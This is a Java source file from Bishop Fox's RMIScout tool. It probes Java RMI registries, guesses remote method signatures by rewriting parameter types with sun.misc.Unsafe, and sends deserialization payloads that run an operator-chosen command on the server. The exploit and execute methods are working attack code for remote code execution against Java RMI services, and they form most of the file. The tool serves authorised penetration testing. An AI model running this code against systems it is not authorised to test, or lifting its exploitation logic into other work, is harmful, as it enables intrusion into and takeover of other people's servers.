package com.bishopfox.rmiscout;

import javassist.*;
import javassist.Modifier;
import javassist.bytecode.DuplicateMemberException;
import sun.misc.Unsafe;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.Serializable;
import java.lang.reflect.*;
import java.rmi.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.*;

@SuppressWarnings({"deprecation", "unchecked"})
public class RMIConnector implements Connector {
    private Registry registry;
    private String host;
    private Map<String, Remote> remoteRefs;
    private Loader customClassLoader;
    private ClassLoader originalClassLoader;
    private boolean allowUnsafe;
    private boolean isSSL;
    private boolean isActivationServer;
    private Class dummyClass;
    private static final int parameterTypesOffset = 52;
    private List<String> signatures;


    @SuppressWarnings("unchecked")
    public RMIConnector(String host, int port, String remoteName, List<String> signatures, boolean allowUnsafe, boolean isActivationServer) {
        try {
            this.host = host;
            this.allowUnsafe = allowUnsafe;
            this.signatures = signatures;
            this.isActivationServer = isActivationServer;
            String[] regNames = null;
            isSSL = false;

            try {
                // Attempt a standard cleartext connection
                this.registry = LocateRegistry.getRegistry(host, port);
                regNames = registry.list();
            } catch (ConnectIOException ce) {
                // Fallback to an insecure (all-trust) SSL Connection
                try {
                    this.registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
                    regNames = registry.list();
                    isSSL = true;
                } catch (ConnectIOException e) {
                    System.err.println(Utilities.Colors.RED + "[ERROR] " + e.getMessage()
                            + "\nMight be RMI-IIOP (--iiop) or server might use non-standard protocol."
                            + Utilities.Colors.ENDC);
                    System.exit(-1);
                }

            }


            this.remoteRefs = new HashMap<>();

            // Switch to custom classloader
            originalClassLoader = Thread.currentThread().getContextClassLoader();

            ClassPool defaultClassPool = ClassPool.getDefault();
            defaultClassPool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
            this.customClassLoader = new Loader(Thread.currentThread().getContextClassLoader(), defaultClassPool);
            customClassLoader.delegateLoadingOf("jdk.internal.misc.Unsafe"); // needed for Mockito#mock
            customClassLoader.delegateLoadingOf("jdk.internal.reflect.MethodAccessorImpl"); // needed for Mockito#mock
            customClassLoader.delegateLoadingOf("jdk.internal.reflect.SerializationConstructorAccessorImpl"); // needed for Mockito#mock & Junit4#Result

            dummyClass = Utilities.generateDummyClass(defaultClassPool);
            CtClass remoteInterface = defaultClassPool.getCtClass(Remote.class.getName());

            // If remoteName is not specificied create a list of all remotes
            if (remoteName != null) {
                regNames = new String[]{remoteName};
            }

            // For each registry create interface bound with test methods
            for (String regName : regNames) {

                // Get remote interface name from exception
                String interfaceName = null;
                try {
                    registry.lookup(regName);
                } catch (UnmarshalException e) {
                    if (e.detail instanceof ClassNotFoundException) {
                        interfaceName = e.detail.getMessage().split(" ")[0];
                    } else {
                        System.err.println(Utilities.Colors.RED + "[ERROR] Error retrieving remote interface className for name '" + regName + "'" + Utilities.Colors.ENDC);
                        System.exit(1);
                    }
                } catch (NotBoundException e) {

                    //DGCClient.registerRefs(new TCPEndpoint(host,1111), (List)var2.getValue());

                    System.err.println(Utilities.Colors.RED + "[ERROR] Registry not bound on remote server: '" + regName + "'" + Utilities.Colors.ENDC);
                    System.exit(1);
                }

                if (interfaceName == null) {
                    interfaceName = (isActivationServer)?"Unknown":"Unknown_Stub";
                }

                String stubName = "DefaultStub";
                if (interfaceName.endsWith("_Stub")) {
                    if (!interfaceName.isEmpty()) {
                        stubName = interfaceName;
                    }
                    interfaceName = stubName + "_Interface";
                }

                CtClass nInterface = defaultClassPool.makeInterface(interfaceName, remoteInterface);
                generateStubs(nInterface, signatures);

                if (interfaceName.endsWith("_Stub_Interface")) {
                    try {
                        defaultClassPool.getCtClass(stubName);
                    } catch (javassist.NotFoundException e) {
                        // Example ActivationStub
                        //
                        // All stubs have same hardcoded serialVersionUID = 2; https://bugs.openjdk.java.net/browse/JDK-4066716
                        //
                        // public class MyClass_Stub extends RemoteStub implements Remote
                        // {
                        //    private static final long serialVersionUID = 2L;
                        // }

                        CtClass activationStub = defaultClassPool.makeClass(stubName, defaultClassPool.getCtClass(RemoteStub.class.getName()));
                        activationStub.setInterfaces(new CtClass[]{nInterface});

                        CtField f = new CtField(CtPrimitiveType.longType, "serialVersionUID", activationStub);
                        f.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.FINAL);
                        activationStub.addField(f, CtField.Initializer.constant(2L));
                        activationStub.toClass(customClassLoader);
                    }
                }


                Thread.currentThread().setContextClassLoader(customClassLoader);

                this.remoteRefs.put(interfaceName, registry.lookup(regName));


            }

        } catch (RemoteException e) {
            if (e.getMessage().contains("class invalid for deserialization")) {
                System.err.println(Utilities.Colors.RED + "[ERROR] RMI Activation Server detected. Re-run with --activation-server" + Utilities.Colors.ENDC);

            } else {
                System.err.println(Utilities.Colors.RED + "[ERROR] " + e.getMessage() + Utilities.Colors.ENDC);
            }
            System.exit(1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void generateStubs(CtClass ctclass, List<String> signatures) {
        try {
            for (String sig : signatures) {
                Utilities.checkAndCreateTypes(sig);

                // Simple method validation
//                if (!sig.matches("[\\w()<>,\\.\\[\\]\\s]+")) {
//                    System.err.println("[INFO] Skipping, Invalid syntax: " + sig);
//                }
                if(sig.matches("^\\w+$")) {
                    System.err.println(Utilities.Colors.RED + "[ERROR] Fatal error: \"" + sig + "\" appears to be a method name, but is not a valid method prototype. See lists/prototypes.txt for examples." + Utilities.Colors.ENDC);
                    System.exit(1);
                }

                boolean wasModified = false;

                // Check for dummy params
                if(sig.matches("^.*\\(\\w[^\\s]*\\).*")) {
                    System.out.println("[INFO] Adding missing dummy parameter names to signature");
                    sig = sig.replace(",", " a,");
                    sig = sig.replace(")", " a)");
                    wasModified = true;
                }

                if(sig.matches(".*\\.\\w+\\(.*")) {
                    System.out.println("[INFO] Removing method FQDN");
                    sig = sig.replaceFirst("[\\w\\.\\$]+\\.", "");
                    wasModified = true;
                }

                if (wasModified) {
                    System.out.println("[INFO] Auto-corrected signature: " + sig);
                }


                CtMethod newmethod = CtNewMethod.make(String.format("%s throws java.rmi.RemoteException;", sig), ctclass);

                // Skip void args because they will always be executed
                if (!allowUnsafe && newmethod.getParameterTypes().length == 0) {
                    System.out.println("[INFO] Skipping, void args: " + sig);
                    continue;
                }

                try {
                    ctclass.addMethod(newmethod);

                } catch (DuplicateMemberException e) {
                    System.out.println("[INFO] Duplicate prototype: " + newmethod);
                }
            }

            ctclass.toClass(customClassLoader);
        } catch (CannotCompileException ce ) {
            if (ce.getReason().contains(ctclass.getSimpleName())) {
                System.err.println("\n" + Utilities.Colors.RED + "[ERROR] Did you forget to remove the interface name from the method name?\n\nFull Stacktrace:\n" + Utilities.Colors.ENDC);
            }
            else if (ce.getReason().contains(",") || ce.getReason().contains(") ")) {
                System.err.println("\n" + Utilities.Colors.RED + "[ERROR] Dummy parameter names are required for method signature (e.g., -s 'boolean login(java.lang.String a, java.lang.String b)') \n\nFull Stacktrace:\n" + Utilities.Colors.ENDC);
            }
            else if (ce.getReason().contains("no such class")) {
                System.err.println("\n" + Utilities.Colors.RED + "[ERROR] Please provide fully-qualified name for this class.\n\nFull Stacktrace:\n" + Utilities.Colors.ENDC);
            }
            ce.printStackTrace();
            System.exit(1);
        } catch (NotFoundException e) {
            e.printStackTrace();
        }
    }

    private boolean checkExploitableParam() {
        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
            Method[] methods = null;

            String registryName = pair.getKey();
            Remote stub = pair.getValue();

            try {
                methods = customClassLoader.loadClass(registryName).getDeclaredMethods();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
                break;
            }

            // Iterate over each method
            for (Method me : methods) {
                String methodSignature = me.toString();
                for (Class c : me.getParameterTypes()) {
                    if (c != java.lang.String.class) {
                        return true;
                    }
                }
            }
        }
        return false;
    }


    public void exploit(String payloadName, String command) {
        Serializable[] payload = new Serializable[]{(Serializable)Utilities.generatePayload(payloadName, command)};

        // Check for universally exploitable param (i.e., non-primitives other than java.lang.String)
        boolean exploitableParam = checkExploitableParam();

        // Try preserving strings during execution if first try fails
        if(!execute(payload, false) && !execute(payload, true)) {
            if (exploitableParam) {
                System.err.println(Utilities.Colors.RED + "[ERROR] Payload was not invoked. Check the accuracy of the signature." + Utilities.Colors.ENDC);
            } else {
                System.err.println(Utilities.Colors.RED + "[ERROR] Server-side JRE (>=8u242-b07, >=11.0.6+10, >=13.0.2+5, >=14.0.1+2) can't be exploited by java.lang.String types" + Utilities.Colors.ENDC);
            }
        } else {
            System.out.println("Executed");
        }
    }

    public void checkIfPresent() {
        try {
            execute(new Serializable[]{(Serializable)dummyClass.newInstance()}, false);
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public boolean execute(Serializable[] payloads, boolean preserveStrings) {
        if (preserveStrings) {
            System.out.println("[INFO] Re-running execute without overwriting java.lang.String types.");
        }
        // Iterate for each registry name
        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
            Method[] methods = null;

            String interfaceName = pair.getKey();
            Remote stub = pair.getValue();

            try {
                methods = customClassLoader.loadClass(interfaceName).getDeclaredMethods();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
                break;
            }

            // Iterate over each method
            for (Method me : methods) {
                String methodSignature = me.toString();

                try {
                    Class[] fakeParameterTypes = null;
                    Object[] params;

                    // Replace parameters and types for attack
                    if (payloads.length == 1) {
                        Serializable payload = payloads[0];
                        // Load payload or dummy object into param slots
                        params = new Object[me.getParameterCount()];
                        if (!preserveStrings) {
                            Arrays.fill(params, payload);
                        } else {
                            int i = 0;
                            for (Class c : me.getParameterTypes()) {
                                if (c == String.class) {
                                    params[i] = "";
                                } else {
                                    params[i] = payload;
                                }
                                i++;
                            }
                        }

                        // Create fake parameter types for payload
                        fakeParameterTypes = new Class[me.getParameterCount()];
                        if (!preserveStrings) {
                            Arrays.fill(fakeParameterTypes, payload.getClass());
                        } else {
                            int i = 0;
                            for (Class c : me.getParameterTypes()) {
                                if (c == String.class) {
                                    fakeParameterTypes[i] = String.class;
                                } else {
                                    fakeParameterTypes[i] = payload.getClass();
                                }
                                i++;
                            }
                        }
                    }
                    // Don't alter parameter types or values for invocation
                    else {
                        params = payloads;
                    }
                    // Bypass internal call flow for custom params
                    RemoteRef ref = null;
                    if (interfaceName.endsWith("_Stub_Interface")) {
                        Field f = RemoteObject.class.getDeclaredField("ref");
                        f.setAccessible(true);
                        ref = (RemoteRef) f.get(stub);
                    } else {
                        Field f = Proxy.class.getDeclaredField("h");
                        f.setAccessible(true);
                        ref = ((RemoteObjectInvocationHandler) f.get(stub)).getRef();
                    }

                    // Localhost-bypass; Breaks with SSL or ActivationServers
                    if (!isSSL && !isActivationServer) {
                        LiveRef lref = ((UnicastRef) ref).getLiveRef();
                        ref = new UnicastRef(new LiveRef(
                                lref.getObjID(),
                                new TCPEndpoint(
                                        host,
                                        lref.getPort(),
                                        lref.getClientSocketFactory(),
                                        lref.getServerSocketFactory())
                                ,
                                false)
                        );
                    }


                    // Calculate MethodHash
                    Method m = RemoteObjectInvocationHandler.class.getDeclaredMethod("getMethodHash", Method.class);
                    m.setAccessible(true);
                    long methodHash = (long)m.invoke(RemoteObjectInvocationHandler.class, me);

                    // Ensure type mismatch to trigger server error
                    // (jdk12+ compatible way to modify java.lang.Method)
                    Field u = Unsafe.class.getDeclaredField("theUnsafe");
                    u.setAccessible(true);
                    Unsafe unsafe = (Unsafe) u.get(null);

                    // Set fake parameter types, if present
                    if (fakeParameterTypes != null) {
                        // Safety Check
                        if (me.getParameterTypes()[0].equals(((Class<?>[]) unsafe.getObject(me, parameterTypesOffset))[0])) {
                            unsafe.putObject(me, parameterTypesOffset, fakeParameterTypes);
                        } else {
                            System.err.println(Utilities.Colors.RED + "[ERROR] JRE version not supported." + Utilities.Colors.ENDC);
                            System.exit(-1);
                        }
                    }

                    // Lightly throttle to prevent corrupting stream. Happens with overloaded methods...
                    // Prevents: java.rmi.UnmarshalException: Error unmarshaling return header occurs;
                    //...
                    //Caused by: java.io.EOFException
                    //	at java.io.DataInputStream.readByte(DataInputStream.java:267)
                    //	at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:222)
                    Thread.sleep(10);

                    // Invoke remote method
                    Object response = ref.invoke(stub, me, params, methodHash);

                    // This next line should only occur when allowUnsafe or when launching exploits
                    System.out.println(Utilities.Colors.YELLOW + "Executed: " + methodSignature + Utilities.Colors.ENDC);
                    System.out.println("\tResponse [" + response.getClass() + "] = " + response.toString());
                    return true;
                } catch (IllegalArgumentException e) {
                    if (e.getMessage().contains("argument type") || e.getMessage().contains("ClassCast")) {
                        System.out.println(Utilities.Colors.GREEN + "Found: " + methodSignature + Utilities.Colors.ENDC);
                        return true;
                    } else {
                        e.printStackTrace();
                    }
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                } catch (ConnectException e) {
                    System.err.println(Utilities.Colors.RED + "[ERROR] " + e.getMessage() + Utilities.Colors.ENDC);
                    System.exit(1);
                } catch (ServerException e) {
                    if(e.getCause().getCause() instanceof ClassNotFoundException) {
                        System.out.println(Utilities.Colors.GREEN + "Found: " + methodSignature + Utilities.Colors.ENDC);
                    } else if(e.getCause() instanceof UnmarshalException) {
                        if (e.getCause().getMessage().contains("unrecognized method hash")) {
                        } else if (e.getCause().getMessage().contains("error unmarshalling arguments")) {
                            System.out.println(Utilities.Colors.GREEN + "Found: " + methodSignature + Utilities.Colors.ENDC);
                        }
                    } else {
                        e.printStackTrace();
                    }
                } catch (ClassCastException e) {
                    System.out.println(Utilities.Colors.GREEN + "Found: " + methodSignature + Utilities.Colors.ENDC);
                } catch (UnmarshalException e) {
                    // Pass
                } catch (Exception e) {
                    e.printStackTrace();
                } catch (Throwable throwable) {
                    // Pass
                }
            }

        }
        return false;
    }

    public void cleanup() {
        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
            String interfaceName = pair.getKey();
            ClassPool defaultClassPool = ClassPool.getDefault();

            try {
                CtClass ctClass = defaultClassPool.getCtClass(interfaceName);
                ctClass.detach();

                if (interfaceName.endsWith("_Stub_Interface")) {
                    defaultClassPool.getCtClass(pair.getValue().getClass().getName()).detach();
                }
            } catch (NotFoundException e) {
                e.printStackTrace();
            }
        }

        // Restore thread's previous classloader
        Thread.currentThread().setContextClassLoader(originalClassLoader);
    }

    @Override
    public void invoke(String[] params) {
        Serializable[] payloads = Utilities.UnmarshalParams(signatures.get(0), params);
        execute(payloads, false);
    }

}
